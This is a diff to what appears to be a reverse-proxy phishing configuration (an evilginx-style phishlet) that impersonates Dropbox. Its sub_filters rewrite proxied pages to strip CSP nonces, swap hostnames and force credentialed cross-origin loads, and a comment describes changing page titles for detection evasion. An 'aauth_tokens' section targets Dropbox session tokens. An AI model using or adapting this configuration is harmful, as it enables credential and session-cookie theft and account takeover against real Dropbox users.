@@ -99,11 +99,11 @@ sub_filters:
   - {triggers_on: 'www.dropbox.com', orig_sub: '', domain: '', search: "nonce", replace: "nononce", mimes: ['text/html']}
   - {triggers_on: 'www.dropbox.com', orig_sub: 'api', domain: 'dropboxapi.com', search: "{hostname}", replace: "{hostname}", mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  # Part to rename title. Should at least be different from real one, but not completely empty (evasion)
-  - {triggers_on: 'www.dropbox.com', orig_sub: '', domain: '', search: "(?i)<title[^>]*>(.*?)</title>", replace: "<title>....</title>", mimes: ["text/html"] }
-  - {triggers_on: 'dropbox.com', orig_sub: '', domain: '', search: "(?i)<title[^>]*>(.*?)</title>", replace: "<title>..</title>", mimes: ["text/html"] }
-  - {triggers_on: 'dropbox.com', orig_sub: '', domain: '', search: 'anonymous"', replace: 'use-credentials"', mimes: ["text/html"] }
-  - {triggers_on: 'www.dropbox.com', orig_sub: '', domain: '',search: 'anonymous"', replace: 'use-credentials"', mimes: ["text/html"] }
-  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: '', domain: '',search: 'anonymous"', replace: 'use-credentials"', mimes: ["text/html", "text/javascript","application/javascript"] }
+ # - {triggers_on: 'www.dropbox.com', orig_sub: '', domain: '', search: "(?i)<title[^>]*>(.*?)</title>", replace: "<title>....</title>", mimes: ["text/html"] }
+#  - {triggers_on: 'dropbox.com', orig_sub: '', domain: '', search: "(?i)<title[^>]*>(.*?)</title>", replace: "<title>..</title>", mimes: ["text/html"] }
+#  - {triggers_on: 'dropbox.com', orig_sub: '', domain: '', search: 'anonymous"', replace: 'use-credentials"', mimes: ["text/html"] }
+#  - {triggers_on: 'www.dropbox.com', orig_sub: '', domain: '',search: 'anonymous"', replace: 'use-credentials"', mimes: ["text/html"] }
+#  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: '', domain: '',search: 'anonymous"', replace: 'use-credentials"', mimes: ["text/html", "text/javascript","application/javascript"] }
 
 aauth_tokens:
   - domain: "www.dropbox.com"
